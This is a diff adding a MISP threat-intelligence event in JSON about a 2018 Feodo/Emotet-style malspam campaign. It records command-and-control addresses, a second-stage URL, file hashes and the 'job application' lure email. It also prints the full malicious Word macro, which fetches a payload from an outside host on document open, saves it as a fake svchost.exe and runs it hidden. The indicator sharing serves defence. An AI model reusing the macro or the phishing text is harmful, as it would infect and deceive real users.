@@ -1,0 +1,354 @@
+{
+    "Event":{
+        "threat_level_id":"3",
+        "date":"2018-05-25",
+        "published":false,
+        "info":"Malspam 2018-05-25: \"Regarding a job.\"",
+        "publish_timestamp":"1527243692",
+        "timestamp":"1527247017",
+        "Tag":[
+            {
+                "name":"misp-galaxy:banker=\"Feodo\""
+            },
+            {
+                "name":"tlp:white"
+            },
+            {
+                "name":"circl:incident-classification=\"malware\""
+            }
+        ],
+        "Attribute":[
+            {
+                "category":"Network activity",
+                "comment":"2nd stage location",
+                "timestamp":"1527238690",
+                "type":"url",
+                "value":"http://185.189.58.180/~filehost/background.png",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"2nd stage location",
+                "timestamp":"1527238684",
+                "type":"ip-dst",
+                "value":"185.189.58.180",
+                "to_ids":true
+            },
+            {
+                "category":"Artifacts dropped",
+                "comment":"contained macro",
+                "timestamp":"1527231892",
+                "type":"text",
+                "value":"Rem Attribute VBA_ModuleType=VBADocumentModule\r\nOption VBASupport 1\r\nPrivate Sub Document_Open()\r\n\r\nDim WinHttpReq As Object\r\nSet WinHttpReq = CreateObject(\"Microsoft.XMLHTTP\")\r\n    \r\nWinHttpReq.Open \"GET\", \"http://185.189.58.180/~filehost/background.png\", False, \"username\", \"password\"\r\nWinHttpReq.send\r\n\r\nDim first5 As String\r\n    Dim second5 As String\r\n    Dim last5 As String\r\n    first5 = ChrW(65) & ChrW(68) & ChrW(79) & ChrW(68) & ChrW(66) & ChrW(46) & ChrW(83) & ChrW(116) & ChrW(114) & ChrW(101)\r\n    second5 = ChrW(97) & ChrW(109)\r\n    last5 = first5 + second5\r\n\r\nxyuhjnx = WinHttpReq.responseBody\r\nIf WinHttpReq.Status = 200 Then\r\n    Set oStream = CreateObject(last5)\r\n    oStream.Open\r\n    oStream.Type = Val(\"1FFF\")\r\n    oStream.Write WinHttpReq.responseBody\r\n    \r\n    Dim first6 As String\r\n    Dim last6 As String\r\n    first6 = ChrW(92) & ChrW(99) & ChrW(104) & ChrW(101) & ChrW(99) & ChrW(107) & ChrW(46) & ChrW(101) & ChrW(120) & ChrW(101)\r\n    last6 = first6\r\n    \r\n    oStream.SaveToFile Environ(\"Temp\") + \"\\svchost.exe\", Val(\"2FFF\")\r\n    oStream.Close\r\n    \r\nEnd If\r\n \r\nCall Shell(Environ(\"Temp\") + \"\\svchost.exe\", 0)\r\n\r\nMsgBox \"The operating system you are using does not support secured documents. Please re-open the document on a different computer. The Microsoft Word will exit now.\"\r\n\r\nActiveDocument.Close\r\n\r\nEnd Sub",
+                "to_ids":false
+            },
+            {
+                "category":"Payload delivery",
+                "comment":"",
+                "timestamp":"1527231975",
+                "type":"email-body",
+                "value":"Hello there! I hope you are well! \r\n\r\nI'm very interested in a opening.\r\nSee my attached CV and get back to me as soon as possible!\r\n\r\nThe file is password protected to protect against identity theft. The password is \"resume\" \r\nThank you! \r\n\r\nHerschel",
+                "to_ids":false
+            },
+            {
+                "category":"Network activity",
+                "comment":"POST",
+                "timestamp":"1527238652",
+                "type":"url",
+                "value":"http://80.82.115.164:4143/",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"POST",
+                "timestamp":"1527238652",
+                "type":"url",
+                "value":"http://213.108.33.44/",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"POST",
+                "timestamp":"1527238653",
+                "type":"url",
+                "value":"http://27.254.150.53:4143/",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"POST",
+                "timestamp":"1527238653",
+                "type":"url",
+                "value":"http://189.51.144.3/",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"POST",
+                "timestamp":"1527238654",
+                "type":"url",
+                "value":"http://159.203.94.198:4143/",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"POST",
+                "timestamp":"1527238654",
+                "type":"url",
+                "value":"http://178.62.39.238:443/",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"POST",
+                "timestamp":"1527238655",
+                "type":"url",
+                "value":"http://178.62.253.139:4143/",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"POST",
+                "timestamp":"1527238656",
+                "type":"url",
+                "value":"http://52.4.64.240:4143/",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"POST",
+                "timestamp":"1527238656",
+                "type":"url",
+                "value":"http://186.103.199.252:4143/",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"POST",
+                "timestamp":"1527238657",
+                "type":"url",
+                "value":"http://71.244.60.231:4143/",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"POST",
+                "timestamp":"1527238657",
+                "type":"url",
+                "value":"http://84.200.208.98/",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"C2 On port 4143",
+                "timestamp":"1527238828",
+                "type":"ip-dst|port",
+                "value":"80.82.115.164|4143",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"C2",
+                "timestamp":"1527238829",
+                "type":"ip-dst",
+                "value":"213.108.33.44",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"C2 On port 4143",
+                "timestamp":"1527238830",
+                "type":"ip-dst|port",
+                "value":"27.254.150.53|4143",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"C2",
+                "timestamp":"1527238831",
+                "type":"ip-dst",
+                "value":"189.51.144.3",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"C2 On port 4143",
+                "timestamp":"1527238831",
+                "type":"ip-dst|port",
+                "value":"159.203.94.198|4143",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"C2 On port 443",
+                "timestamp":"1527238832",
+                "type":"ip-dst|port",
+                "value":"178.62.39.238|443",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"C2 On port 4143",
+                "timestamp":"1527238833",
+                "type":"ip-dst|port",
+                "value":"178.62.253.139|4143",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"C2 On port 4143",
+                "timestamp":"1527238834",
+                "type":"ip-dst|port",
+                "value":"52.4.64.240|4143",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"C2 On port 4143",
+                "timestamp":"1527238835",
+                "type":"ip-dst|port",
+                "value":"71.244.60.231|4143",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"C2 On port 4143",
+                "timestamp":"1527238836",
+                "type":"ip-dst|port",
+                "value":"186.103.199.252|4143",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"C2",
+                "timestamp":"1527238837",
+                "type":"ip-dst",
+                "value":"84.200.208.98",
+                "to_ids":true
+            }
+        ],
+        "Object":[
+            {
+                "comment":"document password: resume (as specified in the initial mail)",
+                "description":"File object describing a file with meta-information",
+                "meta-category":"file",
+                "name":"file",
+                "timestamp":"1527231746",
+                "Attribute":[
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1527231747",
+                        "type":"malware-sample",
+                        "value":"scan_38917.doc|fc3a527586746a950d51e0041f09266a",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1527231748",
+                        "type":"filename",
+                        "value":"scan_38917.doc",
+                        "to_ids":false
+                    },
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1527231748",
+                        "type":"md5",
+                        "value":"<md5>",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1527231749",
+                        "type":"sha1",
+                        "value":"<sha1>",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1527231749",
+                        "type":"sha256",
+                        "value":"<sha256>",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Other",
+                        "comment":"",
+                        "timestamp":"1527231749",
+                        "type":"size-in-bytes",
+                        "value":"37888",
+                        "to_ids":false
+                    }
+                ]
+            },
+            {
+                "comment":"2nd stage from 185.189.58.180",
+                "description":"File object describing a file with meta-information",
+                "meta-category":"file",
+                "name":"file",
+                "timestamp":"1527243694",
+                "Attribute":[
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1527231815",
+                        "type":"malware-sample",
+                        "value":"background.png|e766226346f8d0b097ac7c87edbf605a",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1527231816",
+                        "type":"filename",
+                        "value":"background.png",
+                        "to_ids":false
+                    },
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1527231817",
+                        "type":"md5",
+                        "value":"<md5>",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1527231817",
+                        "type":"sha1",
+                        "value":"<sha1>",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1527231818",
+                        "type":"sha256",
+                        "value":"<sha256>",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Other",
+                        "comment":"",
+                        "timestamp":"1527231818",
+                        "type":"size-in-bytes",
+                        "value":"53575",
+                        "to_ids":false
+                    }
+                ]
+            },
+            {
+                "comment":"",
+                "description":"VirusTotal report",
+                "meta-category":"misc",
+                "name":"virustotal-report",
+                "timestamp":"1527243691"
+            }
+        ]
+    }
+}
